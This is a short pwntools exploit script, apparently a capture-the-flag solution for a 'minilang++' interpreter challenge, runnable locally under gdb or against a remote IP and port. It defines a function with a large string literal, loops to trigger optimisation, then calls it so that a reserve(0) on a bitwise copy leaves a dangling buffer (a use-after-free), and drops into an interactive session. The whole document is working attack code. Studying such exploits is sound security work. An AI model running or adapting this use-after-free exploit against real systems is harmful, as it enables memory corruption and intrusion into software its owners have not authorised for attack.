#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug(['./minilang++'], api=True)
    else:
        return remote('69.90.132.248', 3137)


def prompt(tube):
    tube.recvuntil(b'>>> _\x08')


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.continue_nowait()

        # Bug: CleanupValue() calls reserve(0) on a bitwise copy.
        prompt(tube)
        value = flat({}, length=0x800)
        tube.sendline(b'def kaboom(y: string): int { var x: string = "' + value + b'" + y; return 1; }')

        # Trigger optimization.
        prompt(tube)
        tube.sendline(b'var i: int = 0;')
        prompt(tube)
        tube.sendline(b'while (i < 1000) { set i = i + kaboom(""); }')
        prompt(tube)

        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            tube.gdb.Breakpoint('*(&_ZN6parser17ASTBinaryExprNode4callEN7visitor2vTES2_ + 120)', temporary=True)
            tube.gdb.continue_nowait()

        # Pass a non-empty string so that concatenation result's length !=
        # capacity. This will make bitwise_copy.reserve(0) trigger a
        # reallocation and l_value's buffer in Interpreter::visit() will point
        # to freed memory.
        tube.sendline(b'kaboom("!")')
        tube.interactive()


if __name__ == '__main__':
    main()
